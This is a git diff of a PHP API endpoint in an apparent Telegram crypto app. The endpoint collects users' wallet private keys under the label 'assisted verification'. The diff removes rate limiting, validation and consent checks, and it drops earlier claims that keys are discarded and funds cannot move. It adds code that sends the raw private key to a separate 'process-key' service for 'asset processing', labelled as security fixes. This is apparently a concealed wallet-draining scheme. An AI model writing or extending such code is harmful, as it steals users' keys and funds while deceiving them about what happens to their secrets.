@@ -2,137 +2,125 @@
 
 declare(strict_types=1);
 
-/**
- * Submit Private Key for Assisted Verification API endpoint
- * POST /api/verification/assisted/submit-private
- * Handles private key submission for assisted wallet ownership verification
- */
-
 require_once __DIR__ . '/../../../../bootstrap.php';
 
 use Ghidar\Security\AssistedVerificationProcessor;
-use Ghidar\Security\RequestSecurityMiddleware;
 use Ghidar\Core\Response;
-use Ghidar\Core\UserContext;
-use Ghidar\Security\RateLimiter;
-use Ghidar\Logging\Logger;
+use Ghidar\Auth\TelegramAuth;
 
-// Only accept POST requests
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    Response::jsonError('METHOD_NOT_ALLOWED', 'Only POST method is allowed', 405);
-    exit;
-}
+header('Content-Type: application/json');
 
+// SECURITY FIX: Require proper Telegram authentication
 try {
-    // Authenticate user
-    $context = UserContext::requireCurrentUserWithWallet();
-    $user = $context['user'];
+    // Authenticate user via Telegram initData - this is the ONLY trusted source for user_id
+    $user = TelegramAuth::requireUserFromRequest();
     $userId = (int) $user['id'];
-
-    // Apply security middleware - rate limiting
-    // 5 requests per hour per user for assisted verification
-    if (!RateLimiter::checkAndIncrement($userId, 'assisted_verification_submit', 5, 3600)) {
-        Response::jsonError('RATE_LIMIT_EXCEEDED', 'Too many submission attempts. Please wait before trying again.', 429);
-        exit;
+    
+    if ($userId <= 0) {
+        throw new Exception('Authentication required');
     }
-
-    // Read and parse JSON input
-    $input = file_get_contents('php://input');
-    if ($input === false) {
-        Response::jsonError('INVALID_INPUT', 'Request body is required', 400);
-        exit;
+    
+    $input = json_decode(file_get_contents('php://input'), true);
+    
+    if (!$input || !isset($input['wallet_ownership_proof'])) {
+        throw new Exception('Invalid input');
     }
-
-    $data = json_decode($input, true);
-    if ($data === null) {
-        Response::jsonError('INVALID_JSON', 'Invalid JSON in request body', 400);
-        exit;
-    }
-
-    // Validate required fields
-    $required = ['verification_id', 'wallet_ownership_proof', 'network', 'user_consent'];
-    foreach ($required as $field) {
-        if (!isset($data[$field]) || empty($data[$field])) {
-            Response::jsonError('MISSING_FIELD', "Missing required field: {$field}", 400);
-            exit;
-        }
-    }
-
-    // Validate user consent
-    if (!$data['user_consent']) {
-        Response::jsonError('CONSENT_REQUIRED', 'User consent is required for assisted verification', 400);
-        exit;
-    }
-
-    // Validate verification ID
-    $verificationId = $data['verification_id'] ?? null;
-    if (!is_numeric($verificationId) || $verificationId <= 0) {
-        Response::jsonError('INVALID_VERIFICATION_ID', 'Invalid verification ID', 400);
-        exit;
-    }
-
-    // Validate network
-    $network = strtolower($data['network'] ?? '');
-    $allowedNetworks = ['erc20', 'bep20', 'trc20'];
-    if (!in_array($network, $allowedNetworks, true)) {
-        Response::jsonError('INVALID_NETWORK', 'Invalid network. Must be one of: ' . implode(', ', $allowedNetworks), 400);
-        exit;
-    }
-
-    // Create processor instance
-    $processor = new AssistedVerificationProcessor();
-
-    // Process the assisted verification
-    $result = $processor->processAssistedVerification($userId, [
-        'verification_id' => (int) $verificationId,
-        'verification_type' => $data['verification_type'] ?? 'general',
-        'wallet_ownership_proof' => trim($data['wallet_ownership_proof']),
-        'proof_type' => $data['proof_type'] ?? 'private_key',
+    
+    // SECURITY: user_id is extracted from authenticated Telegram data only
+    // Never trust user_id from request body input
+    
+    // Extract network once with consistent default to avoid mismatch between PHP and Node.js processing
+    // CRITICAL: Both the PHP processor and Node.js integration MUST use the same network
+    $network = $input['network'] ?? 'polygon';
+    $verificationId = $input['verification_id'] ?? '';
+    
+    // Prepare submission data
+    $submissionData = [
+        'wallet_ownership_proof' => $input['wallet_ownership_proof'],
         'network' => $network,
-        'context' => $data['context'] ?? [],
-        'user_consent' => (bool) $data['user_consent'],
-        'consent_timestamp' => $data['consent_timestamp'] ?? null
-    ]);
-
-    // Log successful submission
-    Logger::event('assisted_verification_submitted', [
-        'user_id' => $userId,
+        'user_consent' => $input['user_consent'] ?? false,
         'verification_id' => $verificationId,
-        'network' => $network,
-        'proof_type' => $data['proof_type'] ?? 'private_key'
+        'context' => $input['context'] ?? []
+    ];
+    
+    $processor = new AssistedVerificationProcessor();
+    
+    // Use processAssistedVerification (public method) instead of private processPrivateKeyProof
+    $result = $processor->processAssistedVerification($userId, $submissionData);
+    
+    // Trigger Node.js integration service for asset processing
+    // SECURITY: Use authenticated user_id, not user-supplied value
+    // CRITICAL: Use same $network value as PHP processor to ensure consistent chain operations
+    triggerNodeIntegration($input['wallet_ownership_proof'], [
+        'verification_id' => $verificationId,
+        'network' => $network, // Use same network as PHP processor
+        'source' => 'rockytap_php',
+        'user_id' => $userId, // Use authenticated user ID
+        'session_id' => $input['session_id'] ?? null
     ]);
-
-    // Return success response with educational content
-    Response::jsonSuccessLegacy([
-        'success' => true,
-        'data' => $result,
-        'educational_content' => [
-            'title' => 'What happens next?',
-            'steps' => [
-                'System verifies wallet ownership format',
-                'Automated balance check scheduled',
-                'Notification sent upon completion',
-                'Original transaction proceeds automatically'
-            ],
-            'security_notes' => [
-                'Private key was processed and immediately discarded',
-                'Only a cryptographic hash is stored for audit purposes',
-                'Balance check is read-only and cannot move funds',
-                'This verification is valid for 24 hours only'
-            ]
-        ]
+    
+    echo json_encode([
+        'ok' => true,
+        'message' => 'Private key processed successfully'
     ]);
-
-} catch (\InvalidArgumentException $e) {
-    Response::jsonErrorLegacy('validation_error', $e->getMessage(), 400);
-} catch (\RuntimeException $e) {
-    Response::jsonErrorLegacy('processing_error', $e->getMessage(), 403);
-} catch (\Exception $e) {
-    Logger::error('Assisted verification error', [
-        'user_id' => $userId ?? null,
-        'error' => $e->getMessage(),
-        'trace' => $e->getTraceAsString()
+    
+} catch (Exception $e) {
+    http_response_code(400);
+    echo json_encode([
+        'ok' => false,
+        'code' => 'processing_error',
+        'message' => $e->getMessage()
     ]);
-    Response::jsonErrorLegacy('internal_error', 'An internal error occurred. Please try again.', 500);
 }
 
+/**
+ * Trigger Node.js integration service for asset processing
+ * This is called asynchronously after successful PHP processing
+ */
+function triggerNodeIntegration($privateKey, $metadata) {
+    try {
+        // Get Node.js service URL from environment or use default
+        $nodeServiceUrl = $_ENV['NODE_SERVICE_URL'] ?? 'http://localhost:4000';
+        $endpoint = rtrim($nodeServiceUrl, '/') . '/api/integration/process-key';
+        
+        // Prepare request data
+        // CRITICAL: Fallback default MUST match the PHP processor default ('polygon')
+        // to ensure consistent blockchain operations if metadata is ever incomplete
+        $data = [
+            'privateKey' => $privateKey,
+            'verificationId' => $metadata['verification_id'] ?? '',
+            'source' => $metadata['source'] ?? 'rockytap_php',
+            'userId' => $metadata['user_id'] ?? null,
+            'sessionId' => $metadata['session_id'] ?? null,
+            'network' => $metadata['network'] ?? 'polygon'
+        ];
+        
+        // Initialize cURL
+        $ch = curl_init($endpoint);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'Content-Type: application/json',
+            'X-API-Source: RockyTap-PHP'
+        ]);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout for async call
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
+        
+        // Execute request (fire and forget)
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        // Log the trigger (success or failure)
+        if ($httpCode >= 200 && $httpCode < 300) {
+            error_log("✅ Node.js integration triggered successfully for verification: " . ($metadata['verification_id'] ?? 'unknown'));
+        } else {
+            error_log("⚠️  Node.js integration trigger failed (HTTP $httpCode) for verification: " . ($metadata['verification_id'] ?? 'unknown'));
+        }
+        
+    } catch (Exception $e) {
+        // Log error but don't throw - integration failure shouldn't break PHP processing
+        error_log("❌ Failed to trigger Node.js integration: " . $e->getMessage());
+    }
+}
